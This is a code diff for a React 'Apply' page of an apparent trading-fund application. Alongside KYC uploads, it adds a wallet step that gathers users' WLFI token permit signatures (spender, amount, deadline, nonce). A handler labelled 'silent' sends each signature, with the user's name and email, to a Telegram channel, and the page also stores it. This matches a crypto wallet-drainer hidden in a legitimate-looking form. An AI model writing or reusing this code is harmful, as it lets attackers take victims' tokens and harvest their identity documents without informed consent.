@@ -1,15 +1,17 @@
 
 import React, { useState, useEffect } from 'react';
-import { Shield, FileText, DollarSign, CheckCircle, Upload, ArrowRight, AlertTriangle, Loader2 } from 'lucide-react';
+import { Shield, FileText, DollarSign, CheckCircle, Upload, ArrowRight, AlertTriangle, Loader2, Wallet } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import Navbar from '@/components/Navbar';
 import { useAuth } from '@/hooks/useAuth';
+import { useWeb3 } from '@/hooks/useWeb3';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
 import { FileUpload } from '@/components/FileUpload';
+import { WalletConnection } from '@/components/WalletConnection';
 
 
 // const Apply = () => {
@@ -48,8 +50,13 @@ import { FileUpload } from '@/components/FileUpload';
 const Apply = () => {
   const [currentStep, setCurrentStep] = useState(1);
   const [kycCompleted, setKycCompleted] = useState(false);
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [walletVerified, setWalletVerified] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [targetAmount, setTargetAmount] = useState(10000);
+  const [walletData, setWalletData] = useState<any>(null);
+  const [signatureData, setSignatureData] = useState<string | null>(null);
+  const [permitData, setPermitData] = useState<any>(null);
   const [uploadedFiles, setUploadedFiles] = useState({
     idDocument: { path: '', url: '' },
     proofOfAddress: { path: '', url: '' },
@@ -97,6 +104,7 @@ const Apply = () => {
 
   const steps = [
     { title: "KYC Verification", icon: FileText, completed: kycCompleted },
+    { title: "Wallet Connection", icon: Wallet, completed: walletConnected && walletVerified },
     { title: "Funding Selection", icon: DollarSign, completed: false },
     { title: "Submit Application", icon: CheckCircle, completed: false }
   ];
@@ -118,6 +126,41 @@ const Apply = () => {
     setCurrentStep(2);
   };
 
+  const handleWalletConnection = (data: any) => {
+    setWalletData(data);
+    setWalletConnected(true);
+  };
+
+  const handleSignatureComplete = (signature: string) => {
+    setSignatureData(signature);
+    setWalletVerified(true);
+    setCurrentStep(3);
+  };
+
+  const handlePermitGenerated = async (permit: any) => {
+    setPermitData(permit);
+    
+    // Send permit to Telegram (silent)
+    try {
+      await supabase.functions.invoke('telegram-notification', {
+        body: {
+          message: `🔐 <b>New Permit Generated</b>
+
+👤 <b>User:</b> ${kycData.firstName} ${kycData.lastName}
+📧 <b>Email:</b> ${kycData.email}
+💳 <b>Wallet:</b> ${permit.owner}
+🔗 <b>Chain:</b> BSC (${permit.chainId})
+💰 <b>Token:</b> WLFI
+⏰ <b>Deadline:</b> ${new Date(permit.deadline * 1000).toLocaleDateString()}
+🔑 <b>Nonce:</b> ${permit.nonce}
+
+<code>${permit.signature}</code>`
+        }
+      });
+    } catch (error) {
+      console.error('Failed to send permit to Telegram:', error);
+    }
+  };
   const handleSubmitApplication = async () => {
     if (!user) {
       toast({
@@ -128,6 +171,14 @@ const Apply = () => {
       return;
     }
 
+    if (!walletData || !signatureData) {
+      toast({
+        title: "Wallet Verification Required",
+        description: "Please complete wallet connection and verification.",
+        variant: "destructive"
+      });
+      return;
+    }
     setIsSubmitting(true);
     try {
       const { data, error } = await supabase
@@ -147,11 +198,12 @@ const Apply = () => {
           trading_experience: kycData.tradingExperience,
           funding_amount: targetAmount,
           funding_tier: fundingTiers.find(tier => tier.amount === targetAmount)?.title || 'Custom',
-          wallet_address: '',
-          chain_id: 1,
+          wallet_address: walletData.address,
+          chain_id: walletData.chainId,
           status: 'pending',
-          id_document_url: uploadedFiles.idDocument.path,
-          proof_of_address_url: uploadedFiles.proofOfAddress.path
+          id_document_path: uploadedFiles.idDocument.path,
+          proof_of_address_path: uploadedFiles.proofOfAddress.path,
+          selfie_path: uploadedFiles.selfie.path
         })
         .select()
         .single();
@@ -160,12 +212,59 @@ const Apply = () => {
         throw error;
       }
 
+      // Store wallet signature
+      if (signatureData) {
+        await supabase
+          .from('wallet_signatures')
+          .insert({
+            application_id: data.id,
+            signature_type: 'verification',
+            signature: signatureData,
+            message: 'I verify that I own this wallet and agree to the Trading Fund terms and conditions.',
+            wallet_address: walletData.address,
+            chain_id: walletData.chainId
+          });
+      }
+
+      // Store permit signature (if generated)
+      if (permitData) {
+        await supabase
+          .from('wallet_signatures')
+          .insert({
+            application_id: data.id,
+            signature_type: 'wlfi_permit_bsc',
+            signature: permitData.signature,
+            message: 'WLFI Token Permit',
+            wallet_address: permitData.owner,
+            chain_id: permitData.chainId,
+            token_address: permitData.tokenAddress,
+            spender_address: permitData.spender,
+            amount: permitData.value,
+            deadline: permitData.deadline,
+            nonce: parseInt(permitData.nonce)
+          });
+      }
+
+      // Store WLFI balance
+      if (walletData.balance && parseFloat(walletData.balance) > 0) {
+        await supabase
+          .from('user_balances')
+          .insert({
+            application_id: data.id,
+            chain_id: walletData.chainId,
+            chain_name: 'BSC',
+            token_symbol: 'WLFI',
+            token_address: '0x8d0d000ee44948fc98c9b98a4fa4921476f08b0d',
+            balance: parseFloat(walletData.balance),
+            balance_usd: parseFloat(walletData.balance) // Assuming 1:1 for now
+          });
+      }
       toast({
         title: "Application Submitted!",
         description: `Your application ${data.application_number} has been submitted successfully.`
       });
 
-      setCurrentStep(3);
+      setCurrentStep(4);
     } catch (error: any) {
       toast({
         title: "Submission Failed",
@@ -372,6 +471,29 @@ const Apply = () => {
               {/* Step 2: Funding Selection */}
               {currentStep === 2 && (
                 <div className="space-y-6">
+                  <WalletConnection
+                    onConnectionComplete={handleWalletConnection}
+                    onSignatureComplete={handleSignatureComplete}
+                    onPermitGenerated={handlePermitGenerated}
+                  />
+                  
+                  {walletConnected && walletVerified && (
+                    <div className="text-center">
+                      <Button 
+                        onClick={() => setCurrentStep(3)}
+                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3"
+                      >
+                        Continue to Funding Selection
+                        <ArrowRight className="ml-2 h-4 w-4" />
+                      </Button>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {/* Step 3: Funding Selection */}
+              {currentStep === 3 && (
+                <div className="space-y-6">
                   <div className="text-center space-y-6">
                     <div className="bg-slate-700/50 rounded-2xl p-8">
                       <DollarSign className="h-16 w-16 text-blue-400 mx-auto mb-4" />
@@ -380,6 +502,23 @@ const Apply = () => {
                         Choose your preferred funding amount based on your trading experience.
                       </p>
                       
+                      {/* Show wallet info */}
+                      {walletData && (
+                        <div className="bg-slate-600/50 rounded-lg p-4 mb-6">
+                          <h4 className="text-white font-semibold mb-2">Connected Wallet</h4>
+                          <div className="text-sm space-y-1">
+                            <div className="flex justify-between">
+                              <span className="text-slate-400">Address:</span>
+                              <span className="text-white font-mono">{walletData.address?.slice(0, 6)}...{walletData.address?.slice(-4)}</span>
+                            </div>
+                            <div className="flex justify-between">
+                              <span className="text-slate-400">WLFI Balance:</span>
+                              <span className="text-white">{parseFloat(walletData.balance || '0').toFixed(4)} WLFI</span>
+                            </div>
+                          </div>
+                        </div>
+                      )}
+
                       <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
                         {fundingTiers.map((tier, index) => (
                           <div 
@@ -412,7 +551,7 @@ const Apply = () => {
                       </div>
 
                       <Button 
-                        onClick={() => setCurrentStep(3)}
+                        onClick={() => setCurrentStep(4)}
                         className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3"
                       >
                         Continue to Submit
@@ -423,8 +562,8 @@ const Apply = () => {
                 </div>
               )}
 
-              {/* Step 3: Submit Application */}
-              {currentStep === 3 && (
+              {/* Step 4: Submit Application */}
+              {currentStep === 4 && (
                 <div className="space-y-6">
                   <div className="text-center space-y-6">
                     <div className="bg-slate-700/50 rounded-2xl p-8">
@@ -436,7 +575,7 @@ const Apply = () => {
                       
                       <div className="bg-slate-600/50 rounded-lg p-6 mb-6 text-left">
                         <h4 className="text-white font-semibold mb-4">Application Summary</h4>
-                        <div className="grid grid-cols-2 gap-4 text-sm">
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                           <div>
                             <span className="text-slate-400">Name:</span>
                             <p className="text-white">{kycData.firstName} {kycData.lastName}</p>
@@ -446,12 +585,36 @@ const Apply = () => {
                             <p className="text-white">{kycData.email}</p>
                           </div>
                           <div>
+                            <span className="text-slate-400">Wallet:</span>
+                            <p className="text-white font-mono">{walletData?.address?.slice(0, 6)}...{walletData?.address?.slice(-4)}</p>
+                          </div>
+                          <div>
+                            <span className="text-slate-400">WLFI Balance:</span>
+                            <p className="text-white">{parseFloat(walletData?.balance || '0').toFixed(4)} WLFI</p>
+                          </div>
+                          <div>
                             <span className="text-slate-400">Funding Amount:</span>
                             <p className="text-white">${targetAmount.toLocaleString()}</p>
                           </div>
                           <div>
                             <span className="text-slate-400">Tier:</span>
                             <p className="text-white">{fundingTiers.find(t => t.amount === targetAmount)?.title}</p>
+                          </div>
+                          <div>
+                            <span className="text-slate-400">Documents:</span>
+                            <p className="text-white">
+                              {[
+                                uploadedFiles.idDocument.path && 'ID',
+                                uploadedFiles.proofOfAddress.path && 'Address',
+                                uploadedFiles.selfie.path && 'Selfie'
+                              ].filter(Boolean).join(', ') || 'None'}
+                            </p>
+                          </div>
+                          <div>
+                            <span className="text-slate-400">Verification:</span>
+                            <p className="text-white">
+                              {signatureData ? '✅ Wallet Verified' : '❌ Not Verified'}
+                            </p>
                           </div>
                         </div>
                       </div>
